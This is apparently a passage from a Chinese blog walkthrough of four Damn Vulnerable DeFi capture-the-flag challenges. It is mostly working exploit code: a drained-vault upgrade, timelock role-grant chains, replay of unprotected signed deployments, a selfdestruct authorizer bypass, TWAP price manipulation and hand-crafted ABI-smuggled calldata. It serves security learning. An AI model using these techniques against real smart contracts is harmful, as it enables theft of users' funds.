import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {

        // Cancel AnyRestrictions
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

```

同时，我发现不能直接将`propose`动作打包进去，因为会有一个循环依赖的过程（我生我自己），所以需要推举攻击合约为`proposer`，并通过`call`让攻击合约提案。

攻击合约如下，其实写的有点啰嗦，生成`payload`的过程是可以放一起的。但就这样吧！

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "hardhat/console.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";


contract HackerClimber {

    ClimberTimelock timeClock;
    address upgrade;
    address vault;
    address token;
    address owner;

    constructor(address _target,
                address _upgrade,
                address _vault,
                address _token
                ){
                    timeClock = ClimberTimelock(payable(_target));
                    upgrade = _upgrade;
                    vault = _vault;
                    token = _token;
                    owner = msg.sender;
                }
    
    function attack() public{

        console.log( timeClock.delay() );

        address[] memory targets = new address[](5);
        uint[] memory values = new uint[](5);
        bytes[] memory calldatas = new bytes[](5);

        targets[0] = address(timeClock);
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature(
                            "grantRole(bytes32,address)",
                            PROPOSER_ROLE,
                            address(this)
                        );
        
        targets[1] = address(timeClock);
        values[1] = 0;
        calldatas[1] = abi.encodeWithSignature(
                            "updateDelay(uint64)",
                            0
                        );
        
        targets[2] = vault;
        values[2] = 0;
        calldatas[2] = abi.encodeWithSignature(
                            "upgradeTo(address)",
                            upgrade
                        );
        

        targets[3] = address(this);
        values[3] = 0;
        calldatas[3] = abi.encodeWithSignature(
                            "attack2()"
                        );
        

        targets[4] = vault;
        values[4] = 0;
        calldatas[4] = abi.encodeWithSignature(
                            "withdraw(address,address,uint256)",
                            token,
                            owner,
                            0
                        );       

        timeClock.execute(targets, values, calldatas, "");
        console.log( timeClock.delay() );

        
    }

    function attack2() external {

        console.log("scheduled");
        console.log( timeClock.delay() );

        address[] memory targets = new address[](5);
        uint[] memory values = new uint[](5);
        bytes[] memory calldatas = new bytes[](5);

        targets[0] = address(timeClock);
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature(
                            "grantRole(bytes32,address)",
                            PROPOSER_ROLE,
                            address(this)
                        );
        
        targets[1] = address(timeClock);
        values[1] = 0;
        calldatas[1] = abi.encodeWithSignature(
                            "updateDelay(uint64)",
                            0
                        );
        
        targets[2] = vault;
        values[2] = 0;
        calldatas[2] = abi.encodeWithSignature(
                            "upgradeTo(address)",
                            upgrade
                        );
        

        targets[3] = address(this);
        values[3] = 0;
        calldatas[3] = abi.encodeWithSignature(
                            "attack2()"
                        );
        

        targets[4] = vault;
        values[4] = 0;
        calldatas[4] = abi.encodeWithSignature(
                            "withdraw(address,address,uint256)",
                            token,
                            owner,
                            0
                        );
        
        timeClock.schedule(targets, values, calldatas, "");
    }
}
```

实际操作见`test/climber/climber.challenge.js`：

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const upgradeContract = await (await ethers.getContractFactory('UpgradeClimberVault', player)).deploy(
        );
        console.log("upgradeContract Inited ... : ",upgradeContract.address);
        
        const hacker = await (await ethers.getContractFactory('HackerClimber', player)).deploy(
            timelock.address,
            upgradeContract.address,
            vault.address,
            token.address
        );

        hacker.connect(player).attack();
    });
```

 <hr />

# 13. Wallet-mining

解决思路：

查看最后要求，首先发现要求我们要能够部署（没有私钥）`factory`、`mastercopy`合约，且还要在同一个地址。

我们先解决这一问题

```javascript
        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');
```

这可能吗？我记得合约地址如果通过CREATE来计算：

```
addr = hash(msg.sender, nonce)
```

如果是CREATE2，则是

```
addr = hash("oxff",msg.sender,salt,calldata)
```

以上表明合约是可以创建出来的，并在创建之前已经可以知道其地址，这使得跨链服务成为可能。

但我们创建合约的`player`很明显也不是链上创建者的地址，能做到吗？

<a href="https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY">OP丢失了价值2000万美元的OP通证</a>，这里主要问题就是重放攻击！

但为什么能重放呢，这是因为在创建合约时，发出的经过签名的data未经过EIP155保护，不含有ChainId，因此简单重放就能假冒受害者完成该nonce下的部署。（部署合约需要使用`sendRawTransaction`发送已签名的交易数据。因为部署合约的交易是一笔特殊的交易类型，需要在交易数据中包含新合约的字节码，以及其他合约初始化参数。这些信息需要通过部署合约前的合约编译得到，然后使用私钥对交易数据进行签名，并将签名后的交易数据发送给以太坊网络进行处理。而RPC节点会通过RLP反序列化反推出公钥、地址等信息，从而可以实现冒充）。再补充一下（一旦交易被签名后，交易数据就不可更改，直到交易被打包进区块中。当交易到达 RPC 节点时，节点会验证交易的签名是否有效，并将交易解析为 RLP 格式，然后将其广播到整个网络中。在这个过程中，签名是不会被修改的。RLP 格式包含交易的各个字段，包括发送方地址。）

我们先从etherscan上找到raw data（more -> **get Raw transaction Hash**），随后在`test/wallet-mining/wallet-mining.challenge.js`中进行攻击：

```javascript
        console.log("player address is %s",player.address);
        const deployCode = require("./deployCode.json");

        
        const victim = "0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a";
        await player.sendTransaction(
            {
                to : victim,
                value : ethers.utils.parseEther("1")
            }
        );
        console.log("victim received eth in wei : %s", await ethers.provider.getBalance(victim));


        console.log("deploying safe ...");
        const deployCopy = await (await ethers.provider.sendTransaction(deployCode.copy)).wait();
        console.log("Success! Safe deployed at %s",deployCopy.contractAddress);

        console.log("random Transaction");
        (await ethers.provider.sendTransaction(deployCode.random)).wait();

        console.log("deploying factory ...");
        const deployFac = await (await ethers.provider.sendTransaction(deployCode.fact)).wait();
        console.log("Success! Fac deployed at %s",deployFac.contractAddress);

        console.log("victim received eth in wei : %s", await ethers.provider.getBalance(victim));
```

此时，尽管是player假冒，但扣的依旧是victim的ETH，这就是签名重放的危害。（切记一定要注意顺序，因为`nonce`仍是`victim`的地址）。

我们接下来的传入不会通过`WalletDeployer`进行，因为它创建`proxy`时所指定的逻辑地址是`copy`。而我们则是想转账回去，所以我们自己手写攻击合约：

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract HackerWalletMining1 {

    constructor(){

    }

    function tryHack(IERC20 token,address receiver) public{
        if (token.balanceOf(address(this))!=0){
            console.log("attacking...");
            token.transfer(receiver,token.balanceOf(address(this)));
            console.log("finish transfering");
        }
    }


}
```

很明显，我们要通过`proxyFactory`生成合约，如果对应token有余额，则我们会进行转出。

```solidity
        const hacker1 = await (await ethers.getContractFactory('HackerWalletMining1', player)).deploy();

        const calldata = hacker1.interface.encodeFunctionData(
            "tryHack(address,address)",[token.address,player.address]
        );

        const factory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(deployFac.contractAddress);
        console.log("Get Factory instance : %s",factory.address);

        for (i = 0; i < 100; i++){
           await factory.connect(player).createProxy(hacker1.address,calldata);
        }
```

很幸运，我们已经从空闲地址转移出来了通证，下面就是试着拿到`walletDeployer`中的43个通证了。这个切入点就是看看能不能将合约升级，`can`返回值永远通过！

我们发现`AuthorizerUpgradeable`的逻辑合约尚未初始化，所以我们可以初始化并升级合约。但要升级成什么样子？由于`walletDeployer`中通过staticCall获取信息：

```
        assembly { 
            let m := sload(0)
            if iszero(extcodesize(m)) {return(0, 0)}
            let p := mload(0x40)
            mstore(0x40,add(p,0x44))
            mstore(p,shl(0xe0,0x4538c4eb))
            mstore(add(p,0x04),u)
            mstore(add(p,0x24),a)
            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
        }
```

如果我们将合约自毁，就可以绕过这里面的限制。从而有

`        console.log(await walletDeployer.callStatic.can(player.address,DEPOSIT_ADDRESS)); // True!!!`

所以我们编写自毁合约`HackerWalletMining2`：

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

import "hardhat/console.sol";

contract HackerWalletMining2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    constructor(){

    }

    function hack(address receiver) public{
        console.log("destruct");
        selfdestruct(payable(receiver));
    }

    function upgradeToAndCall(address imp, bytes memory wat) external payable override {
        _authorizeUpgrade(imp);
        _upgradeToAndCallUUPS(imp, wat, true);
    }

    function _authorizeUpgrade(address imp) internal override onlyOwner {}

}
```

然后我们在`test/wallet-mining/wallet-mining.challenge.js`中编写，这里我们通过`init`获取到逻辑合约的权限，并通过`upgradeToAndCall`完成自毁。

此时就可以绕过`walletDeployer`的检查。从而通过发送`setup`（要求，前面有提过）通过`WalletDeployer`创建合约并绕过检查。

```javascript
const logicContract = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(logicContractAddress);
        await logicContract.connect(player).init([],[]);
        
        const hacker2 = await (await ethers.getContractFactory('HackerWalletMining2', player)).deploy();
        console.log("hacker 2 contract deployed : %s",hacker2.address);

        const calldata2 = hacker2.interface.encodeFunctionData(
            "hack(address)",[player.address]
        );

        console.log(calldata2);

        await logicContract.connect(player).upgradeToAndCall(hacker2.address,calldata2);
        
        // configure setup
        const calldata3 = new ethers.utils.Interface(["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)"])
                            .encodeFunctionData(
                                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                [[player.address],
                                1,
                                "0x0000000000000000000000000000000000000000",
                                0,
                                "0x0000000000000000000000000000000000000000",
                                "0x0000000000000000000000000000000000000000",
                                0,
                                "0x0000000000000000000000000000000000000000",]
                            );
        console.log("success configured calldata3 ", calldata3);

        for (i = 0; i < 43 ; i++){
            await walletDeployer.connect(player).drop(calldata3);
        }
```

<hr />

# 14. Puppet - V3

解题思路：

Uniswap V3 喂价采用的是`time-weighted average price(TWAP)`，即随着时间比重算出加权后的价格。所以很明显，在同一笔交易内是不可能完成的了，因此闪电贷的思路可以歇歇了。

整体思路不变，先“砸盘”，等价格下来了(过一段时间)，再借不迟！

我们还是先找到uniswap的Router为`0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45`。同时为了能够生成实例，安装依赖`npm install @uniswap/swap-router-contracts`

选用exactInputSingle函数进行交换（已经存在相关的池子）。进行砸盘，并通过轮询，找到合适的价格并入场。

`test/puppet-v3/puppet-v3.challenge.js`中攻击如下，在110s左右价格就达到了合适的入场点位。

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log("before Swapping...");
        console.log("token : %s", await token.balanceOf(player.address));
        console.log("ETH : %s", await ethers.provider.getBalance(player.address));
        console.log("WETH : %s", await weth.balanceOf(player.address));

        const routerAddr = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
        const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');

        const router = new ethers.Contract(routerAddr, routerJson.abi, player);
        console.log("router created ... %s", router.address );

        await token.connect(player).approve(router.address,PLAYER_INITIAL_TOKEN_BALANCE);

        await router.connect(player).exactInputSingle(
            [
            token.address,
            weth.address,
            3000,
            player.address,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
            ]
        )

        console.log("before Swapping...");
        console.log("token : %s", await token.balanceOf(player.address));
        console.log("ETH : %s", await ethers.provider.getBalance(player.address));
        console.log("WETH : %s", await weth.balanceOf(player.address));
        const value = BigNumber.from(await weth.balanceOf(player.address));
        for (i = 1; i < 115; i++){
            time.increase(1);
            const needToDeposit = await lendingPool.callStatic.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
            console.log("after %s seconds",i);
            console.log(value);
            console.log(needToDeposit);
            if (value.gt(needToDeposit)){
                console.log("exit",i);
                break;
            }
        }
        time.increase(3);
        await weth.connect(player).approve(lendingPool.address,await weth.balanceOf(player.address));
        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

    });
```

V3 能有效防止价格操纵。。因为随着时间的增加，进入了多人博弈。

<hr />

# 15 ABI-Smuggling

解决思路：

检查传入的id

```javascript
        console.log("sweeping : %s ",ethers.utils.id("sweepFunds(address,address)"));
        console.log("withdraw : %s ",ethers.utils.id("withdraw(address,address,uint256)"));
```

可知，`player`允许`withdraw`而`deployer`则是`sweep`。仔细检查，·发现问题可能出现在`execute`函数中。

```solidity
    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }
```

这里先计算出`calldataOffset`从而获取`selector`，从而验证用户是否具有权限。最后再进行`target.functionCall`。但用这样解构`actionData`有没有漏洞呢，我们又没有办法可以实现偷梁换柱呢？

在调用`execute`时，整体callData如下（注意actionData是）：

| **FS (4 bytes)**     | **函数选择器(Selector)** | **0xaaaaaaaa** |
| -------------------- | ------------------------ | -------------- |
| **0x00  (32 bytes)** | **target(address)**      | **.....**      |
| **0x20 (32 bytes)**  | **actiondata location**  | **0x40**       |
| **0x40 (32 bytes)**  | **actiondata length**    | **.....**      |
| **0x60**             | **actiondata contens**   |                |

`uint256 calldataOffset = 4 + 32 * 3;`实际上就是赵的`actiondata`开头的`bytes4`。

这是建立在`actiondata location`正确指向`actiondata length`，两者被正确pack的情况。如果我们在`location`和`actiondatalength`中间插入一段无意义字节，但仍能够正确指向，evm依旧能够正确识别！(此时不在slot里，不需要严格按照slot 32字节对齐，但最后一定要是32的整数，能够对齐)。



最终生成，详细信息见注释：

```
0x1cff79cd // execute
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512  // address(vault)

0000000000000000000000000000000000000000000000000000000000000064  // 32 + 32 + 32 + 4 =100 = 0x64（不算一开始的execute）
0000000000000000000000000000000000000000000000000000000000000000  // random 0 paading (fixed 32 b)
d9caed12 // withdraw
0000000000000000000000000000000000000000000000000000000000000044  // calldata size (4 + 32 + 32 = 68 = 0x44)
85fb709d // sweep
0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc // recovery.address
0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 // token.address
000000000000000000000000000000000000000000000000 // 补全0
```

具体生成过程见`test/abi-smuggling/abi-smuggling.challenge.js`

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log("sweeping : %s ",ethers.utils.id("sweepFunds(address,address)"));
        console.log("withdraw : %s ",ethers.utils.id("withdraw(address,address,uint256)"));
        
        const executeSig = await vault.interface.getSighash(
            await vault.interface.getFunction("execute")
        );
        console.log(executeSig);

        const vaultAddr = await ethers.utils.hexZeroPad(
            vault.address,
            32
        );
        console.log(vaultAddr);

        const randoms = await ethers.utils.hexZeroPad(
            "0x0",
            32
        );
        console.log(randoms);

        // length 32*2 + 4 = 68 = 0x44
        const actionDataContent = await vault.interface.encodeFunctionData(
            "sweepFunds(address,address)",
            [recovery.address,
            token.address]
        );
        console.log(actionDataContent);

        const actionDataLength = await ethers.utils.hexZeroPad(
            "0x44",
            32
        );

        const withdraw = await vault.interface.getSighash(
            await vault.interface.getFunction("withdraw")
        );

        // 32 bytes + 32 bytes + 32bytes + 4 bytes = 100 bytes = 0x64
        const  actionDataStore = await ethers.utils.hexZeroPad(
            "0x64",
            32
        )
        
        // 32 + 32 + 4 + 32 + 100 + 24 = 224 = 32 * 7 
        const padding  = await ethers.utils.hexZeroPad(
            "0x0",
            24
        );

        const action = await ethers.utils.hexConcat(
            [actionDataStore, randoms, withdraw, actionDataLength, actionDataContent,padding]
        );

        const calldata = await ethers.utils.hexConcat(
            [executeSig,vaultAddr,action]
        );

        console.log(calldata);

        await player.sendTransaction({
            to: vault.address,
            data : calldata
        });


    });
```

<hr />

# 总结

很开心，完成了`Damn Vulnerable Defi`的挑战。区块链安全真的内容很多，充满机会，但也是黑暗森林，不得不防守。接下来，我会开展`DefiHackLabs`的分享。欢迎关注！

BTW，我目前也有想换一个工作环境，Open to Opportunities!
